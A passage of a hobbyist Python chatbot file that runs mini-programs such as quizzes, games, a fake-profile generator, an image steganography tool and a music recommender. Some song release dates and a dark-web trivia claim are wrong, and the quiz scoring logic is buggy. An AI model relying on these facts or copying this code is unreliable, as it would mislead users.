                "Fake IDs and Counterfeiting: The dark web is a prime location for buying fake IDs, social security numbers, and counterfeit currency.",
                "Hitmen for Hire: Although most of these claims are hoaxes, there are some listings on the dark web that promise assassination services.",
                "WikiLeaks Mirror Sites: The dark web hosts mirror sites for platforms like WikiLeaks, allowing users to access sensitive leaked documents safely.",
                "Illegal Gambling: Dark web markets are known to host gambling and betting sites that operate outside of legal jurisdictions.",
                "Dark Web Search Engines: There are specific search engines designed for the dark web, like 'DuckDuckGo' for Tor, which allows users to find hidden content.",
        ]
        print(f"\n1. A Common Fact: {random.choice(common_facts)}")
        print(f"2. An Unheard Fact: {random.choice(unheard_facts)}\n")

        return "Here are 2 Facts!"
    elif "-pnt" in ui:
        import random
        def main():
            print("----- PERSONALITY TEST -----")
            print("Answer some fun questions to find out about your unique personality!")

            questions = [
                {
                    "question": "If you could have any superpower, which would you choose?",
                    "options": ["1. Invisibility", "2. Flying", "3. Telepathy", "4. Time Travel"],
                    "scores": ["Adventurous", "Dreamer", "Empathetic", "Curious"]
                },
                {
                    "question": "What would you do on a free Sunday?",
                    "options": ["1. Read a book", "2. Explore outdoors", "3. Play video games", "4. Sleep all day"],
                    "scores": ["Knowledge Seeker", "Explorer", "Strategist", "Relaxer"]
                },
                {
                    "question": "Pick a color that represents you:",
                    "options": ["1. Blue", "2. Red", "3. Yellow", "4. Green"],
                    "scores": ["Calm", "Passionate", "Cheerful", "Grounded"]
                },
                {
                    "question": "What is your ideal vacation destination?",
                    "options": ["1. A tropical beach", "2. A bustling city", "3. A mountain retreat", "4. A historical site"],
                    "scores": ["Relaxer", "Energetic", "Peaceful", "Intellectual"]
                },
                {
                    "question": "Which animal do you relate to the most?",
                    "options": ["1. Eagle", "2. Cat", "3. Dolphin", "4. Wolf"],
                    "scores": ["Independent", "Mysterious", "Friendly", "Loyal"]
                },
                {
                    "question": "What is your favorite genre of movies or shows?",
                    "options": ["1. Action", "2. Comedy", "3. Drama", "4. Sci-fi"],
                    "scores": ["Thrill Seeker", "Lighthearted", "Emotional", "Imaginative"]
                },
                {
                    "question": "If you could master a skill instantly, what would it be?",
                    "options": ["1. Cooking", "2. Playing an instrument", "3. Coding", "4. Sports"],
                    "scores": ["Creative", "Artistic", "Tech-savvy", "Energetic"]
                },
                {
                    "question": "How do you prefer to spend your weekends?",
                    "options": ["1. Socializing with friends", "2. Working on hobbies", "3. Relaxing alone", "4. Traveling"],
                    "scores": ["Social Butterfly", "Creative Thinker", "Introverted", "Adventurous"]
                },
                {
                    "question": "What kind of music do you enjoy the most?",
                    "options": ["1. Pop", "2. Rock", "3. Classical", "4. Hip-Hop"],
                    "scores": ["Trendy", "Rebellious", "Sophisticated", "Dynamic"]
                },
                {
                    "question": "How do you handle challenges?",
                    "options": ["1. Face them head-on", "2. Seek advice", "3. Analyze deeply", "4. Avoid them"],
                    "scores": ["Brave", "Collaborative", "Strategic", "Reserved"]
                }
            ]

            # Track user's personality traits
            traits = {}

            # Ask each question
            for i, q in enumerate(questions, 1):
                print(f"\nQuestion {i}: {q['question']}")
                for option in q['options']:
                    print(option)

                while True:
                    try:
                        print("---------------------------")
                        choice = int(input("Choose an option (1-4): "))
                        if 1 <= choice <= 4:
                            chosen_trait = q['scores'][choice - 1]
                            traits[chosen_trait] = traits.get(chosen_trait, 0) + 1
                            break
                        else:
                            print("Please enter a number between 1 and 4.")
                    except ValueError:
                        print("Invalid input. Please enter a number.")

            # Combine and display all personality traits
            print("\n--- Personality Test Results ---")
            # print("Here's a summary of your personality traits:")
            # for trait, score in traits.items():
            #     print(f"- {trait}: {score}")

            # Determine dominant personality traits
            max_score = max(traits.values())
            dominant_traits = [trait for trait, score in traits.items() if score == max_score]

            print("\nYour dominant personality traits are:")
            for trait in dominant_traits:
                print(f"- {trait}")

        if __name__ == "__main__":
            main()
        print("------------------------------------------------------------------------")
        return("Thank you for taking the test! Share your results with friends!")

    elif "-plt" in ui:
        import random
        import time

        code_snippets = {
            "print('Hello, world!')": "Hello, world!",
            "print(2 + 3)": "5",
            "print('Python' + ' is ' + 'fun')": "Python is fun",
            "numbers = [1, 2, 3, 4, 5]\nprint(numbers)": "[1, 2, 3, 4, 5]",
            "num1 = 10\nnum2 = 5\nprint(num1 * num2)": "50",
            "def fibonacci(n):\n    if n <= 0:\n        return 'Invalid input'\n    elif n == 1:\n        return 0\n    elif n == 2:\n        return 1\n    else:\n        return fibonacci(n-1) + fibonacci(n-2)\nprint(fibonacci(6))": "5",
            "x = [1, 2, 3, 4]\nprint(x[2])": "3",
            "num = 10\nif num % 2 == 0:\n    print('Even')\nelse:\n    print('Odd')": "Even",
            "a = 5\nb = 2\nprint(a // b)": "2",  # Integer division
            "a = [1, 2, 3]\nb = [4, 5, 6]\nprint(a + b)": "[1, 2, 3, 4, 5, 6]",
            "x = {1, 2, 3}\nprint(3 in x)": "True",
            "def factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * factorial(n - 1)\nprint(factorial(5))": "120",
            "string = 'hello'\nprint(string[::-1])": "olleh",  # String reversal
            "def is_palindrome(s):\n    return s == s[::-1]\nprint(is_palindrome('madam'))": "True",
        }

        # Difficulty levels with corresponding sets of code snippets
        difficulty_levels = {
            "easy": ["print('Hello, world!')", "print(2 + 3)", "x = [1, 2, 3, 4]\nprint(x[2])", "num = 10\nif num % 2 == 0:\n    print('Even')\nelse:\n    print('Odd')"],
            "medium": ["print('Python' + ' is ' + 'fun')", "numbers = [1, 2, 3, 4, 5]\nprint(numbers)", "a = 5\nb = 2\nprint(a // b)", "string = 'hello'\nprint(string[::-1])"],
            "hard": ["num1 = 10\nnum2 = 5\nprint(num1 * num2)", "def fibonacci(n):\n    if n <= 0:\n        return 'Invalid input'\n    elif n == 1:\n        return 0\n    elif n == 2:\n        return 1\n    else:\n        return fibonacci(n-1) + fibonacci(n-2)\nprint(fibonacci(6))", "def factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * factorial(n - 1)\nprint(factorial(5))", "def is_palindrome(s):\n    return s == s[::-1]\nprint(is_palindrome('madam'))"]
        }

        def get_random_code_snippet(difficulty):
            """Return a random Python code snippet based on the selected difficulty."""
            return random.choice(difficulty_levels[difficulty])

        def main():
            print("---- PYTHON LANGUAGE LEARNING GAME ----")
            difficulty = input("Select difficulty (easy, medium, hard): ").lower()

            # Initialize game settings
            lives = 3
            score = 0
            time_limit = 45  # Time limit in seconds for each code snippet

            while True:
                code_snippet = get_random_code_snippet(difficulty)
                expected_output = code_snippets[code_snippet]

                print("\nCode Snippet:")
                print(code_snippet)

                start_time = time.time()
                user_guess = input("Your Guess: ")

                elapsed_time = time.time() - start_time
                if elapsed_time > time_limit:
                    print(f"Time's up! The correct output was: {expected_output}")
                    lives -= 1
                elif user_guess == expected_output:
                    print("Correct! You earned 10 points.")
                    score += 10
                else:
                    print(f"Oops! The correct output was: {expected_output}")
                    lives -= 1

                if lives == 0:
                    print("Game Over! You've run out of lives.")
                    break

                print(f"Lives remaining: {lives}")
                print(f"Your current score: {score}")

                play_again = input("Do you want to play again? (y/n): ")
                if play_again.lower() != "y":
                    break
            print(f"Your final score: {score}")

        if __name__ == "__main__":
            main()
            print("---------------------------------------------")
            return "Hope you liked the Python Learning Game!"
        
    elif "-fpg" in ui:
        import random
        import string

        # Dictionary for fake profiles
        def generate_fake_profile():
            fake_profile = {
                "name": generate_name(),
                "age": random.randint(18, 60),
                "email": generate_email(),
                "address": generate_address(),
                "phone": generate_phone_number(),
                "job": random.choice(["Engineer", "Teacher", "Doctor", "Artist", "Developer", "Designer", "Manager", "BusinessMan", "Programmer"]),
                "company": generate_company_name(),
                "bio": generate_bio()
            }
            return fake_profile

        # Generate a random name
        def generate_name():
            first_names = ["John", "Jane", "Michael", "Emily", "Chris", "Laura", "Daniel", "Sarah", "Anthony", "Will", "Ashley", "Ryan", "Travis", "Franklin", "Jill", "Claire", "Arun", "Lucky"]
            last_names = ["Smith", "Johnson", "Brown", "Taylor", "Anderson", "Lee", "Harris", "Clark", "Carter", "Brook", "Scott", "Noah", "Oliviera", "Wang", "Miani", "Ivanov"]
            return f"{random.choice(first_names)} {random.choice(last_names)}"

        # Generate a random email
        def generate_email():
            domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com", "proton.me"]
            return f"{generate_random_string(8)}@{random.choice(domains)}"

        # Generate a random address
        def generate_address():
            streets = ["Main St", "High St", "Maple Ave", "Oak Dr", "Pine St", "Elm St"]
            cities = ["Springfield", "Rivertown", "Lakeside", "Hilltop", "Sunnyvale", "Greenville"]
            return f"{random.randint(100, 999)} {random.choice(streets)}, {random.choice(cities)}"

        # Generate a random phone number
        def generate_phone_number():
            return f"+1-{random.randint(100, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"

        # Generate a random company name
        def generate_company_name():
            prefixes = ["Tech", "Global", "Green", "Bright", "Dynamic", "Prime", "Wiggle", "Sus"]
            suffixes = ["Solutions", "Corp", "Industries", "Enterprises", "Group", "Systems"]
            return f"{random.choice(prefixes)} {random.choice(suffixes)}"

        # Generate a random bio
        def generate_bio():
            hobbies = ["reading", "traveling", "coding", "painting", "cycling", "gaming", "photography", "boating", "chess"]
            return f"I enjoy {random.choice(hobbies)} and spending \ntime with family and friends."

        # Helper to generate random strings
        def generate_random_string(length):
            return ''.join(random.choices(string.ascii_lowercase, k=length))

        # Generate a single random fake profile formatted for output
        def generate_random_profile():
            profile = generate_fake_profile()
            formatted_profile = (
                f"Name: {profile['name']}\n"
                f"Age: {profile['age']}\n"
                f"Email: {profile['email']}\n"
                f"Address: {profile['address']}\n"
                f"Phone: {profile['phone']}\n"
                f"Job: {profile['job']}\n"
                f"Company: {profile['company']}\n"
                f"Bio: {profile['bio']}\n"
                f"-----------------------------------"
            )
            print(formatted_profile)
        print("----- FAKE PROFILE GENERATOR -----")
        #print("----------------------------------")
        # Example usage
        if __name__ == "__main__":
            (generate_random_profile())
            return "Fake Profile Generated!"
    elif "-zmg" in ui:
        import random
        score = 0

        print("Take this quiz and find out how long you would survive amongst the walking dead.")
        print("There are easy, intermediate and hard questions all mixed together.")
        print("There may be more than one correct answer.\nGood luck!")

        # ---- question 1 ----
        print("Your house is burning down. What do you save?")
        print("""
1. your dog
2. some food cans
3. your clothes
4. your cell phone""")
        answer = input("Choose(1/2/3/4): ")

        if answer == "1":
            score += random.randint(10,20)
        if answer == "2":
            score += random.randint(5,10)
        else:
            score += 3
        print("")

        # ---- question 2 ----
        print("It is night, and you will freeze to death soon. Making too much noise/light will attract the zombies. What do you do?")
        print("""
1. keep moving around
2. build a tiny fire
3. build a normal fire
4. try to wait out the night""")
        answer = input("Choose(1/2/3/4):")

        if answer == "2":
            score += random.randint(10,20)
        if answer == "4":
            score += random.randint(5,10)
        else:
            score += 3
        print("")

        # ---- question 3 ----
        print("You are cornered in a grocery store with only a knife. A horde is moving in from all sides. What do you do?")
        print("""
1. kill zombies to make a path
2. try to climb up on the wobbly shelves
3. shout for help
4. self kill""")
        answer = input("Choose(1/2/3/4):")

        if answer == "2":
            score += random.randint(10,20)
        if answer == "1":
            score += random.randint(5,10)
        else:
            score += 3
        print("")
        # ---- question 4 ----
        print("You see a group of survivors ahead on the road. What do you do?")
        print("""
1. watch them for a while
2. ignore them
3. kill them and steal their stuff
4. try to greet them""")
        answer = input("Choose(1/2/3/4):")

        if answer == "1":
            score += random.randint(10,20)
        if answer == "3":
            score += random.randint(5,10)
        else:
            score += 3
        print("")

        # ---- question 5 ----
        print("A group of about 6 people take your stuff at gunpoint, then tell you to get in a storage container. What do you do?")
        print("""
1. get in the container
2. try to reason with them
3. refuse
4. try to fight them""")
        answer = input("Choose(1/2/3/4):")

        if answer == "1":
            score += random.randint(10,20)
        if answer == "4":
            score += random.randint(5,10)
        else:
            score += 3
        print("")

        # ---- question 6 ----
        print("You and 3 other people are down to 1 last can or food. What do you do?")
        print("""
1. share it
2. eat it
3. give it to them
4. burn it so there is no argument""")
        answer = input("Choose(1/2/3/4):")

        if answer == "2":
            score += random.randint(10,20)
        if answer == "1":
            score += random.randint(5,10)
        else:
            score += 3
        print("")

        # ---- question 7 ----
        print("You are given the choice between 4 weapons. What do you take?")
        print("""
1. katana
2. crossbow
3. pistol
4. RPG""")
        answer = input("Choose(1/2/3/4):")

        if answer == "2":
            score += random.randint(10,20)
        if answer == "3":
            score += random.randint(5,10)
        else:
            score += 3
        print("")

        # ---- question 8 ----
        print("You only have room in your pack for 1 more package of food. What do you take?")
        print("""
1. trail mix
2. crackers
3. oreos
4. raw chicken""")
        answer = input("Choose(1/2/3/4):")

        if answer == "3":
            score += random.randint(10,20)
        if answer == "4":
            score += random.randint(5,10)
        else:
            score += 3  
        print("")

        # ---- question 9 ----
        print("You have some choices on where to set up camp.")
        print("""
1. next to the river
2. in the mountains
3. near the ocean
4. next to the city""")
        answer = input("Choose(1/2/3/4):")

        if answer == "1":
            score += random.randint(10,20)
        if answer == "2":
            score += random.randint(5,10)
        else:
            score += 3  
        print("")

        # ---- question 10 ----
        print("Your camp, with your group of ~20 people, has been overrun by a horde. What do you do?")
        print("""
1. follow your friends
2. run
3. try and save the camp
4. get your stuff from your tent""")
        answer = input("Choose(1/2/3/4):")

        if answer == "3":
            score += random.randint(10,20)
        if answer == "4":
            score += random.randint(5,10)
        else:
            score += 3  
        print("")

        # ---- end ----
        print("The results are in!")
        print("You scored a {}%".format(score))

        if score == (0,5):
                print('You would be one of the first peopple to die in the apocalypse.\nYou panic at the sight of a zombie and have no survival skills, getting eaten within an hour.\nPathetic.')
        if score in range(6, 20):
                print('You would live a few hours in the apocalypse.\nAs the chaos begins, you make a desperate attempt to save your stuff.\nGetting into the car, you get surrounded.\nThey break open the windows and eat you.\nThat must suck.')
        if score in range(21, 50):
                print('You would live a few days in the apocalypse.\nAs the chaos begins, you attempt to go to the emergency shelters.\nYou die when they get overcrowded and overrun.\nToo bad.')
        if score in range(51, 80):
                print('You would live a month in the apocalypse.\nYou find a camp and manage to survive for a month, but when the camp gets overrun, you get bit.\nSo close, yet so far.')
        if score in range(81, 110):
                print('You would live a few months in the apocalypse.\nYour camp moves from place to place before settling at an old school building.\nAfter living there for a month, you accidentally shoot yourself with a crossbow while attempting to load it.\nAt least you tried.')
        if score in range(111, 130):
                print('You would live a few years in the apocalypse.\nYour group settles at a town in Tennessee, fortifying it so that it can withstand a horde.\nWhile on a run, you fall through a floor and break your leg, attracting zombies and getting eaten.\nYou will be remembered.')
        if score in range(131, 1000):
                print('You would live for a really long time in the apocalypse.\nBeing the leader of your group, you settle at a town near the beach, where hardly any hordes pass through.\nYou help build a utopia named Z-Land.\nAt the age of 79, you pass away in your sleep.\nThere was a statue of you built.')
        return "Thanks for playing Mini Zombie Game!"
        
    elif "-stg" in ui:
        import os
        import builtins
        try:
            from PIL import Image
        except ImportError:
            return("This program can't run without the 'pillow' library. Please install it using 'pip install pillow' or 'pip3 install pillow'.")

        def encode_message(image_path, secret_message, output_path):
            """Encodes a secret message into an image."""
            try:
                image = Image.open(image_path)
                if image.mode != 'RGB':
                    image = image.convert('RGB')

                encoded_image = image.copy()
                width, height = encoded_image.size
                pixels = encoded_image.load()

                # Append delimiter to message to mark the end
                secret_message += '|||'
                binary_message = ''.join([builtins.format(ord(char), '08b') for char in secret_message])

                # Check if the image has enough capacity
                if len(binary_message) > width * height * 3:
                    print("Error: The image is too small to hold the secret message.")
                    return

                binary_index = 0
                for y in range(height):
                    for x in range(width):
                        pixel = list(pixels[x, y])
                        for i in range(3):  # Modify RGB values
                            if binary_index < len(binary_message):
                                pixel[i] = (pixel[i] & ~1) | int(binary_message[binary_index])
                                binary_index += 1
                        pixels[x, y] = tuple(pixel)
                        if binary_index >= len(binary_message):
                            break
                    if binary_index >= len(binary_message):
                        break

                encoded_image.save(output_path)
                print(f"Message encoded successfully and saved as {output_path}")
            except Exception as e:
                print(f"Error: {e}")

        def decode_message(image_path):
            """Decodes a hidden message from an image."""
            try:
                image = Image.open(image_path)
                if image.mode != 'RGB':
                    image = image.convert('RGB')

                width, height = image.size
                pixels = image.load()

                binary_message = ''
                for y in range(height):
                    for x in range(width):
                        pixel = pixels[x, y]
                        for i in range(3):
                            binary_message += str(pixel[i] & 1)

                # Convert binary to text and split at the delimiter
                all_bytes = [binary_message[i:i+8] for i in range(0, len(binary_message), 8)]
                decoded_message = ''.join([chr(int(byte, 2)) for byte in all_bytes])
                hidden_message = decoded_message.split('|||')[0]

                print("Hidden Message:", hidden_message)
                return hidden_message
            except Exception as e:
                print(f"Error: {e}")

        if __name__ == "__main__":
            print("------- STEGANOGRAPHY --------")
            print("Hide and Reveal Text in Images")
            print("""
Recommendations for using Steganography:
1. Use smaller images (1KB-80KB) to speed up encryption and decryption processes. Larger images might take longer to handle.
2. Always use the same image for both encryption and decryption. This ensures accuracy when extracting hidden data.
3. Ensure that the image used to hide the data remains unchanged for decryption; any modification could corrupt the hidden data.
4. Image format recommendation: PNG
""")
            print("1. Encode Message")
            print("2. Decode Message")
            print("3. Exit")
            choice = input("Enter your choice (1/2/3): ")

            if choice == '1':
                image_path = input("Enter the path of the image: ")
                if not os.path.exists(image_path):
                    print("Image not found!")
                else:
                    secret_message = input("Enter the secret message: ")
                    output_path = input("Enter the output image path (e.g., encoded_image.png): ")
                    encode_message(image_path, secret_message, output_path)
            elif choice == '2':
                image_path = input("Enter the path of the encoded image: ")
                if not os.path.exists(image_path):
                    print("Image not found!")
                else:
                    decode_message(image_path)
            elif choice == '3':
                print("Exited..")
            else:
                print("Invalid choice!")
        return "Thanks for using Steganography!"
    
    elif "-msc" in ui: #Music suggestion
        import random
        print("---- MUSIC SUGGESTION PROGRAM ----")

        while True:
            genre = input("Enter Your Favorite Genre - \n1. Pop\n2. Hip-Hop/Rap\n3. K-Pop\n4. Rock\n5. Hindi Music\n6. Desi Hip-Hop\n7. R&B\n8. Exit \n(1/2/3/4/5/6/7/8): ").lower().strip()

            if genre in ["1", "pop"]:
                Pop = [
                    "'Shape of You' - Ed Sheeran (2017)",
                    "'Therefore I Am' - Billie Eilish (2020)",
                    "'Don't Start Now' - Dua Lipa (2019)",
                    "'Someone You Loved' - Lewis Capaldi (2018)",
                    "'Best Friend' - Saweetie (2021)",
                    "'As It Was' - Harry Styles (2022)",
                    "'Good 4 U' - Olivia Rodrigo (2021)",
                    "'Save Your Tears' - The Weeknd (2020)",
                    "'Levitating' - Dua Lipa (2020)",
                    "'Closer' - The Chainsmokers ft. Halsey (2016)",
                    "'Taki Taki' - DJ Snake ft. Selena Gomez, Ozuna, Cardi B (2018)",
                    "'Bad Guy' - Billie Eilish (2019)",
                    "'Bye Bye Bye' - *NSYNC (2000)",
                    "'We Are Never' - Taylor Swift (2012)",
                    "'Ocean Eyes' - Billie Eilish (2017)",
                    "'Baby' - Justin Bieber (2009)",
                    "'New Rules' - Dua Lipa (2017)",
                    "'Everything I Wanted' - Billie Eilish (2019)",
                    "'What's Poppin' - Jack Harlow (2020)"
                ]
                print(random.choice(Pop))

            elif genre in ["2", "hip-hop/rap", "rap", "hiphop"]:
                Hiphop = [
                    "'Sicko Mode' - Travis Scott (2018)",
                    "'Old Town Road' - Lil Nas X (2019)",
                    "'Life Goes On' - BTS (2020)",
                    "'Best Friend - Saweetie (2021)",
                    "'Stay' - The Kid LAROI & Justin Bieber (2021)",
                    "'Mood' - 24kGoldn ft. Iann Dior (2020)",
                    "'Goosebumps' - Travis Scott (2016)",
                    "'Hotline Bling' - Drake (2015)",
                    "'FE!N' - Travis Scott (2023)",
                    "'Praise the Lord' - A$AP Rocky ft. Skepta (2018)",
                    "'The Box' - Roddy Ricch (2019)",
                    "'M.A.A.D City' - Kendrick Lamar (2012)",
                    "'Still Dre' - Dr. Dre ft. Snoop Dogg (1999)",
                    "'Big Dawgs - HanumanKind (2024)",
                    "'Sticky - Tyler (2022)",
                    "'Like That' - Future (2024)",
                    "'Gospel' - Dr.Dre & Eminem (2022)",
                    "'Yo Bunny' - probycpkshawn (2024)",
                    "'9mm' - Memphis Cult (2023)",
                    "'Smack That' - Akon (2006)",
                    "'Laugh Now Cry Later' - Drake (2016)"
                ]
                print(random.choice(Hiphop))

            elif genre in ["3", "k-pop", "kpop", "k pop"]:
                Kpop = [
                    "'Gangnam Style' - PSY (2012)",
                    "'Dynamite' - BTS (2020)",
                    "'Butter' - BTS (2021)",
                    "'Cookie' - NewJeans (2023)",
                    "'Strategy' - TWICE (2024)",
                    "'DARARI' - TREASURE (2022)",
                    "'APT.' - Rose ft. Bruno Mars(2024)",
                    "'DASH' - NMIXX (2023)",
                    "'LALISA' - Lisa (2021)",
                    "'Yet to come' - BTS (2022)",
                    "'RUN' - BTS (2015)",
                    "'Attention' -  NewJeans (2022)",
                    "'ETA' - NewJeans (2023)",
                    "'BET ON ME' - ITZY (2022)",
                    "'Mamushi' - TWICE & Megan Thee Stallion (2024)",
                    "'Smart' - LE SSERAFIM (2024)",
                    "'TANK' - NMIXX (2022)",
                    "'BAD NEWS' - KISS OF LIFE (2023)",
                    "'CAKE' - KARD(2022)",
                    "'GOLD' - ITZY (2024)",
                    "'Goblins' - A.C.E (2020)"
                ]
                print(random.choice(Kpop))

            elif genre in ["4", "rock"]:
                Rock = [
                    "'Hotel California' - Eagles (1977)",
                    "'Sweet Child O' Mine' - Guns N' Roses (1987)",
                    "'Believer' - Imagine Dragons (2017)",
                    "'Euphoria' - Bring Me the Horizon (2023)",
                    "'Heat Above' - Gretta Van Fleet (2021)",
                    "'Caution' - The Killers (2020)",
                    "'Paradise' - Coldplay (2011)",
                    "'Can You Feel My Heart' - Bring Me the Horizon (2013)",
                    "'Sweater Weather' - The Neighbourhood (2013)",
                    "'Black Summer' - Red Hot Chili Peppers (2022)",
                    "'Dystopia' - Royal Blood (2021)",
                    "'Shut Up And Dance' - WALK THE MOON(2015)",
                    "'Heathens' - Twenty One Pilots (2016)",
                    "'High Hopes' - Panic! At The Disco (2018)",
                    "'Run Away' - Del Shannon (1989)",
                    "'Running on Empty' - Bruce Springsteen (2018)",
                    "'Seven Nation Army' - The White Stripes (2003)",
                    "'Cut The Cord' - Shine Down (2015)",
                    "'Shawed off Shotgun' - The Glorious Sons (2017)",
                    "'Oh Yeah!' - Green Day (2020)",
                    "'Gravity' - Holding Absence (2020)"
                ]
                print(random.choice(Rock))

            elif genre in ["5", "hindi music"]:
                Hindi = [
                    "'Dil Diyan Gallan' - Atif Aslam (2017)",
                    "'Tum Hi Ho' - Arijit Singh (2013)",
                    "'Tera Ban Jaunga' - Akhil Sachdeva & Tulsi Kumar (2019)",
                    "'Mann Bharrya' - B Praak (2017)",
                    "'Genda Phool' - Badshah & Payal Dev (2020)",
                    "'Dil Chori' - Yo Yo Honey Singh (2018)",
                    "'Dilbar' - Neha Kakkar, Dhvani Bhanushali & Ikka (2018)",
                    "'Illegal Weapon 2.0' - Jasmine Sandlas & Garry Sandhu (2019)",
                    "'Naach Meri Rani' - Guru Randhawa & Nikhita Gandhi (2020)",
                    "'Tera Hone Laga Hoon' - Atif Aslam & Alisha Chinai (2009)",
                    "'Bekhayali' - Sachet Tandon (2019)",
                    "'Ghungroo' - Arijit Singh, Shilpa Rao (2019)",
                    "'Garmi' - Badshah & Neha Kakkar (2020)",
                    "'Tera Yaar Hoon Main' - Arijit Singh (2018)",
                    "'Tum Se Hi' - Mohit Chauhan (2007)",
                    "'Dilbar Mere' - Kishore Kumar (1982)",
                    "'Kala Chasma' - Amar Arshi, Badshah & Neha Kakkar (2016)",
                    "'Na Na Na Na' - JStar (2015)",
                    "'DJ Wale' - Badshah (2015)",
                    "'Sanak' - Badshah (2023)",
                    "'Dhinka Chika' Mika Singh (2011)"
                ]
                print(random.choice(Hindi))

            elif genre in ["6", "desi hip-hop", "desi hiphop", "desi hip hop"]:
                Desi = [
                    "'Machayenge' - Emiway Bantai (2018)",
                    "'Pagal' - Badshah (2019)",
                    "'Bantai' - Emiway Bantai (2019)",
                    "'Big Dawgs' - HanumanKind (2024)",
                    "'Elevated' - Shubh (2021)",
                    "'Bandana' - Shubh (2024)",
                    "'KADAK BAN' - Emiway Bantai (2018)",
                    "'Mere Gully Mein' - Divine ft. Naezy (2015)",
                    "'Apna Time Aayega' - Ranveer Singh (2019)",
                    "'Firse Machayenge' - Emiway Bantai (2022)",
                    "'Khatam' - Emiway Bantai (2018)",
                    "'Mein Wahi Hoon' - Badshah (2017)",
                    "'NO LOVE' - Shubh (2021)",
                    "'Cheques' - Shubh (2022)",
                    "'Tere Baare Mein' - Shubh (2020)",
                    "'LOVE DOSE' - Yo Yo Honey Singh (2014)",
                    "'295' - Sidhu Moose Wala (2021)",
                    "'These Days' - Sidhu Moose Wala (2021)",
                    "'Chennai City' - AJ (2017)",
                    "'Brown Munde' - AP DHILLON (2021)"
                ]
                print(random.choice(Desi))

            elif genre in ["7", "r&b", "rnb"]:
                RnB = [
                    "'Blinding Lights' - The Weeknd (2019)",
                    "'Stay' - The Kid LAROI & Justin Bieber (2021)",
                    "'Save Your Tears' - The Weeknd (2020)",
                    "'Levitating' - Dua Lipa (2020)",
                    "'Good 4 U' - Olivia Rodrigo (2021)",
                    "'As It Was' - Harry Styles (2022)",
                    "'Calm Down' - Rema (2023)",
                    "'Dance Monkey' - Tones and I (2019)",
                    "'Someone You Loved' - Lewis Capaldi (2018)",
                    "'Closer' - The Chainsmokers ft. Halsey (2016)",
                    "'Bad Guy' - Billie Eilish (2019)",
                    "'Made You Look' - Meghan Trainor (2022)",
                    "'Your Power' - Billie Eilish (2021)",
                    "'No Time To Die' - Billie Eilish (2020)",
                    "'Lost Cause' - Billie Eilish (2021)",
                    "'BEST PART' -  H.E.R (2017)",
                    "'OTW' - Khalid (2018)",
                    "'Window Seat' - Erykah Badu (2010)",
                    "'Loyal' - Chris Brown (2014)",
                    "'Side to Side' - Ariana Grande (2013)"
                ]
                print(random.choice(RnB))

            elif genre in ["8", "exit"]:
                print("---------------------")

            else:
                print("Invalid Input. Please try again.")
            return("You will definitely like this Music!")
        
    elif "bye" in ui or "ok bye" in ui or "okay bye" in ui or "-exit" in ui:
        print("\033[34mMinibot\033[0m: Exiting the program. Goodbye!")
        exit()  # Immediately terminate the program
    elif "-wyr" in ui:
        # "Would You Rather" questions stored in a dictionary
        import random
        would_you_rather = {
            1: {"question": "Would you rather have the ability to fly or be invisible?", 
                "options": ["fly", "invisible"]},
            2: {"question": "Would you rather live on the moon or under the sea?", 
                "options": ["moon", "sea"]},
            3: {"question": "Would you rather have unlimited money or unlimited time?", 
                "options": ["money", "time"]},
            4: {"question": "Would you rather eat only pizza for a year or never eat pizza again?", 
                "options": ["pizza", "never"]},
            5: {"question": "Would you rather always be 10 minutes late or 20 minutes early?", 
                "options": ["late", "early"]},
            6: {"question": "Would you rather have the power of teleportation or time travel?", 
                "options": ["teleportation", "time travel"]},
            7: {"question": "Would you rather be able to talk to animals or speak every language?", 
                "options": ["animals", "language"]},
            8: {"question": "Would you rather be rich but lonely or poor and loved?", 
                "options": ["rich", "loved"]},
            9: {"question": "Would you rather explore space or the deep ocean?", 
                "options": ["space", "ocean"]},
            10: {"question": "Would you rather always have to sing instead of talking or dance everywhere you go?", 
                "options": ["sing", "dance"]},
            11: {"question": "Would you rather always be able to tell when someone is lying or always get away with lying?", 
                "options": ["tell", "get away"]},
            12: {"question": "Would you rather have unlimited free Wi-Fi wherever you go or free coffee for life?", 
                "options": ["wifi", "coffee"]},
            13: {"question": "Would you rather be able to read minds or control minds?", 
                "options": ["read", "control"]},
            14: {"question": "Would you rather have a rewind button or a pause button for your life?", 
                "options": ["rewind", "pause"]},
            15: {"question": "Would you rather lose your sense of taste or your sense of smell?", 
                "options": ["taste", "smell"]},
            16: {"question": "Would you rather never be stuck in traffic again or never get another cold?", 
                "options": ["traffic", "cold"]},
            17: {"question": "Would you rather be able to eat anything and stay healthy or sleep only 2 hours a day and feel fully rested?", 
                "options": ["eat", "sleep"]},
            18: {"question": "Would you rather have a personal maid or a personal chef?", 
                "options": ["maid", "chef"]},
            19: {"question": "Would you rather live in a world without movies or without music?", 
                "options": ["movies", "music"]},
            20: {"question": "Would you rather always know what to say or always know what to do?", 
                "options": ["say", "do"]},
        }

        # Convert dictionary values to a list
        question_list = list(would_you_rather.values())

        # Shuffle the list
        random.shuffle(question_list)

        # Select the first 5 questions
        selected_questions = question_list[:5]

        # Function to play the game
        def wyr():
            print("Welcome to 'Would You Rather'!\n")
            for idx, q in enumerate(selected_questions):
                print(f"Q{idx + 1}: {q['question']}")
                for i, option in enumerate(q['options']):
                    print(f"{i + 1}. {option}")
                
                # Get user answer
                answer = input("Your choice (1 or 2): ").strip()
                
                # Validate input
                if answer in ["1", "2"]:
                    print(f"You chose: {q['options'][int(answer) - 1].capitalize()}!\n")
                else:
                    print("Invalid choice. Please pick 1 or 2.\n")
        # Run the game
        wyr()
        return "That was hard to choose, right?!"

    elif "-lpm" in ui:
        import os
        # Custom binary map for encoding
        custom_binary_map = {
            'A': '0x1f', 'B': 'fx2a', 'C': '4x3d', 'D': '5x4c', 'E': '9x5b',
            'F': 'sx6e', 'G': 'Ox7f', 'H': 'zx8p', 'I': 'lx9q', 'J': '1xaf',
            'K': 'qxbf', 'L': 'gxcf', 'M': 'kxdf', 'N': 'bxef', 'O': 'xxff',
            'P': 'bx0g', 'Q': 'ax1h', 'R': '5x2i', 'S': 'nx3j', 'T': 'ax4k',
            'U': 'tx5l', 'V': 'yx6m', 'W': 'ux7n', 'X': 'ix8o', 'Y': 'px9p',
            'Z': '0x0q', 'a': 'q1`!', 'b': 'w7:v', 'c': 'e5;*', 'd': 'r3i0', 'e': 't9ip',
